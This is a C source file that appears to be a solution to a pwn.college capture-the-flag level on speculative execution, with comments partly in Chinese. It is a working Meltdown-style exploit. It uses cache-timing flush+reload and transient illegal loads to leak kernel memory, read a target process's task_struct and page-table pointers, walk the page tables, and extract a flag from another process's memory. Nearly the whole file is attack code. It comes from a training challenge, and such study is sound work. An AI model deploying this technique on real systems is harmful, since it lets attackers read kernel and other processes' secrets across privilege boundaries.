// Microarchitecture Exploitation - Molten Walk
// https://pwn.college/system-security/speculative-execution/level14
#define _GNU_SOURCE

#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#define DEVICE_PATH "/proc/pwncollege"

#define PAGE_SIZE 0x1000UL
#define NUM_PAGES 256
#define ATTEMPTS 100
#define SHMEM_SIZE (NUM_PAGES * PAGE_SIZE)

// ====== 已确认的偏移 ======
#define OFFSET_MM 0x3e0
#define OFFSET_PGD 0x50

// flag 在 victim 中的虚拟地址（objdump 确认）
#define FLAG_VA 0x404060UL

// 内核 direct-map 基址
#define PAGE_OFFSET_BASE 0xffff888000000000UL

static volatile unsigned char *shared_mem;
static sigjmp_buf jbuf;

static inline uint64_t rdtsc_begin(void)
{
    _mm_lfence();
    return __rdtsc();
}

static inline uint64_t rdtsc_end(void)
{
    unsigned aux;
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static inline void clflush(const volatile void *addr)
{
    _mm_clflush((const void *)addr);
    _mm_mfence();
}

static inline uint64_t measure(volatile unsigned char *addr)
{
    uint64_t start = rdtsc_begin();
    (void)*addr;
    return rdtsc_end() - start;
}

static void flush_all(void)
{
    for (unsigned i = 0; i < NUM_PAGES; ++i)
        clflush(shared_mem + (size_t)i * PAGE_SIZE);
}

void sigsegv_handler(int sig)
{
    siglongjmp(jbuf, 1);
}

static void attack(int fd, uint64_t addr)
{
    if (sigsetjmp(jbuf, 1) != 0)
        return;

    // 先 touch，提高命中率
    ioctl(fd, 1337, addr);

    asm volatile(
        ".intel_syntax noprefix\n"

        // ===== 高延迟：浮点开方 =====
        "mov rax, 0x40000000\n" // 较大的数
        "cvtsi2sd xmm0, rax\n"  // 转成 double
        "sqrtsd xmm0, xmm0\n"   // 开方（很慢）
        "sqrtsd xmm0, xmm0\n"   // 再开一次，进一步拉长延迟
        "cvtsd2si rax, xmm0\n"  // 转回整数（可选，保持依赖）

        // ===== Meltdown transient =====
        "xor rax, rax\n"
        "mov al, byte ptr [%[addr]]\n"        // 非法 load
        "shl rax, 12\n"                       // * 4096
        "mov al, byte ptr [%[probe] + rax]\n" // probe load（必须是 load）

        ".att_syntax prefix\n"
        :
        : [addr] "r"(addr),
          [probe] "r"(shared_mem)
        : "rax", "xmm0", "memory");
}

static void probe(unsigned scores[256], uint64_t threshold)
{
    // Include value 0 in the probe, as it may be a valid byte value
    for (unsigned value = 0x00; value <= 0xff; ++value)
    {
        volatile unsigned char *addr =
            shared_mem + (size_t)value * PAGE_SIZE;

        if (measure(addr) <= threshold)
            ++scores[value];
    }
}

static unsigned find_best(const unsigned scores[256])
{
    unsigned best = 0;
    for (unsigned value = 0x00; value <= 0xff; ++value)
    {
        if (scores[value] > scores[best])
            best = value;
    }
    return best;
}

static uint64_t calibrate_threshold(void)
{
    volatile unsigned char *addr =
        shared_mem + 0x80 * PAGE_SIZE;
    (void)*addr;

    uint64_t hit_total = 0;
    uint64_t miss_total = 0;

    for (unsigned i = 0; i < ATTEMPTS; ++i)
    {
        hit_total += measure(addr);
        clflush(addr);
        miss_total += measure(addr);
    }

    uint64_t hit = hit_total / ATTEMPTS;
    uint64_t miss = miss_total / ATTEMPTS;
    uint64_t threshold = (hit * 2 + miss) / 3;
    printf("calibration: hit=%lu miss=%lu threshold=%lu\n",
           hit, miss, threshold);

    return threshold;
}

static unsigned char leak_byte(int fd, uint64_t threshold, uint64_t addr)
{
    unsigned rounds[256] = {0};

    for (;;)
    {
        unsigned scores[256] = {0};

        for (unsigned i = 0; i < ATTEMPTS; ++i)
        {
            // train step is optional...
            flush_all();
            attack(fd, addr);
            probe(scores, threshold);
        }

        unsigned best = find_best(scores);

        // Skip if no hits
        if (scores[best] < 1)
            continue;

        if (++rounds[best] >= 2)
            return best;
    }
}

static uint64_t read64(int fd, uint64_t threshold, uint64_t addr)
{
    uint64_t val = 0;
    for (int i = 0; i < 8; i++)
    {
        val |= (uint64_t)leak_byte(fd, threshold, addr + i) << (i * 8);
    }
    return val;
}

static int is_kernel_ptr(uint64_t p)
{
    return (p > 0xffff800000000000UL) &&
           (p < 0xffffffff00000000UL) &&
           ((p & 0xfff) == 0);
}

static uint64_t get_task_struct(int fd, pid_t pid)
{
    struct
    {
        pid_t pid;
        uint64_t task;
    } arg = {.pid = pid};

    if (ioctl(fd, 31337, &arg) < 0)
    {
        perror("ioctl 31337");
        exit(1);
    }
    return arg.task;
}

static uint64_t walk_page_table(int fd, uint64_t threshold, uint64_t pgd_kva, uint64_t va)
{
    uint64_t idx, entry, table;

    // PGD
    idx = (va >> 39) & 0x1ff;
    entry = read64(fd, threshold, pgd_kva + idx * 8);
    printf("  PGD[%lu] = 0x%lx\n", idx, entry);
    if (!(entry & 1))
        return 0;
    table = (entry & ~0xfffUL) + PAGE_OFFSET_BASE;

    // PUD
    idx = (va >> 30) & 0x1ff;
    entry = read64(fd, threshold, table + idx * 8);
    printf("  PUD[%lu] = 0x%lx\n", idx, entry);
    if (!(entry & 1))
        return 0;
    table = (entry & ~0xfffUL) + PAGE_OFFSET_BASE;

    // PMD
    idx = (va >> 21) & 0x1ff;
    entry = read64(fd, threshold, table + idx * 8);
    printf("  PMD[%lu] = 0x%lx\n", idx, entry);
    if (!(entry & 1))
        return 0;
    table = (entry & ~0xfffUL) + PAGE_OFFSET_BASE;

    // PTE
    idx = (va >> 12) & 0x1ff;
    entry = read64(fd, threshold, table + idx * 8);
    printf("  PTE[%lu] = 0x%lx\n", idx, entry);
    if (!(entry & 1))
        return 0;

    uint64_t phys = (entry & 0x000ffffffffff000UL) + (va & 0xfff);
    return phys;
}

static void mode_mm(int fd, uint64_t threshold)
{
    uint64_t task = get_task_struct(fd, getpid());
    printf("[+] task_struct = 0x%lx\n\n", task);

    printf("偏移            值\n");
    printf("----------------------------------------\n");
    for (uint64_t off = 0x300; off <= 0x500; off += 8)
    {
        uint64_t val = read64(fd, threshold, task + off);
        printf("task+0x%03lx   0x%016lx", off, val);
        if (is_kernel_ptr(val))
            printf("    ★★★");
        printf("\n");
    }
}

static void mode_pgd(int fd, uint64_t threshold, uint64_t mm_addr)
{
    printf("[+] mm = 0x%lx\n\n", mm_addr);

    printf("偏移       值\n");
    printf("----------------------------------------\n");
    for (uint64_t off = 0x00; off <= 0xb0; off += 8)
    {
        uint64_t val = read64(fd, threshold, mm_addr + off);
        printf("mm+0x%02lx   0x%016lx", off, val);
        if (is_kernel_ptr(val))
            printf("    ★★★");
        printf("\n");
    }
}

static void mode_flag(int fd, uint64_t threshold, pid_t pid)
{
    printf("[+] target pid = %d\n", pid);

    uint64_t task = get_task_struct(fd, pid);
    printf("[+] task_struct = 0x%lx\n", task);

    uint64_t mm = read64(fd, threshold, task + OFFSET_MM);
    printf("[+] mm          = 0x%lx\n", mm);

    uint64_t pgd = read64(fd, threshold, mm + OFFSET_PGD);
    printf("[+] pgd         = 0x%lx\n\n", pgd);

    printf("[*] Walking page tables for VA 0x%lx ...\n", FLAG_VA);
    uint64_t phys = walk_page_table(fd, threshold, pgd, FLAG_VA);
    if (!phys)
    {
        printf("[-] page walk failed\n");
        return;
    }
    printf("[+] physical address = 0x%lx\n", phys);

    uint64_t flag_kva = phys + PAGE_OFFSET_BASE;
    printf("[+] flag kernel VA   = 0x%lx\n\n", flag_kva);

    printf("[*] Leaking flag ...\n");
    uint64_t flag_offset = 0;

    char flag[64] = {0};
    size_t len = 0;
    for (unsigned target = flag_offset; target < flag_offset + 64; ++target)
    {
        flag[len++] = leak_byte(fd, threshold, flag_kva + target);
        flag[len] = '\0';
        printf("%s\n", flag);
        if (flag[len - 1] == '}')
            break;
    }
}

static int open_device(void)
{
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0)
        return -1;

    // Allocate shared_mem locally in userspace
    shared_mem = mmap(NULL, SHMEM_SIZE, PROT_READ | PROT_WRITE,
                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    if (shared_mem == MAP_FAILED)
    {
        close(fd);
        return -1;
    }

    return fd;
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        fprintf(stderr,
                "Usage:\n"
                "  %s mm                   - search mm offset (self)\n"
                "  %s pgd <mm_addr>        - search pgd offset\n"
                "  %s flag <pid>           - leak flag from victim\n",
                argv[0], argv[0], argv[0]);
        return 1;
    }

    int fd = open_device();
    if (fd < 0)
        return 1;

    signal(SIGSEGV, sigsegv_handler);
    uint64_t threshold = calibrate_threshold();

    if (strcmp(argv[1], "mm") == 0)
    {
        mode_mm(fd, threshold);
    }
    else if (strcmp(argv[1], "pgd") == 0)
    {
        if (argc < 3)
        {
            fprintf(stderr, "need mm address\n");
            return 1;
        }
        uint64_t mm = strtoull(argv[2], NULL, 0);
        mode_pgd(fd, threshold, mm);
    }
    else if (strcmp(argv[1], "flag") == 0)
    {
        if (argc < 3)
        {
            fprintf(stderr, "need pid\n");
            return 1;
        }
        pid_t pid = atoi(argv[2]);
        mode_flag(fd, threshold, pid);
    }
    else
    {
        fprintf(stderr, "unknown mode: %s\n", argv[1]);
        return 1;
    }

    munmap((void *)shared_mem, SHMEM_SIZE);
    close(fd);
    return 0;
}
